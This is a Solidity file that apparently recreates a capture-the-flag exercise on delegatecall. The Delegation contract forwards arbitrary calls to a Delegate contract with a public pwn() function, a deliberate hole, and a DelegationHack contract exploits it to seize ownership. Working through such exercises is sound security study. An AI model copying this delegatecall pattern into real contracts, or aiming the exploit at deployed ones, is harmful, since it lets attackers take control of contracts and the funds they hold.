// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

// goal: claim ownership of Delegation contract

// two original contracts
// deploy this first
contract Delegate {

  address public owner;

  constructor(address _owner) {
    owner = _owner;
  }

  function pwn() public {
    owner = msg.sender;
  }
}

// deploy this second
// and use the address of deployed Delegate as an argument in constructor
contract Delegation {

  address public owner;
  Delegate delegate;

  constructor(address _delegateAddress) {
    delegate = Delegate(_delegateAddress);
    owner = msg.sender;
  }

  fallback() external {
    (bool result,) = address(delegate).delegatecall(msg.data);
    if (result) {
      this;
    }
  }
}

// a contract that hacks the original one
// deploy it third
contract DelegationHack {

  // use this function with Delegation address as an argument
  function hack(address _delegation) public {
    _delegation.call(
    abi.encodeWithSelector(Delegate.pwn.selector)
    );
  }
  
}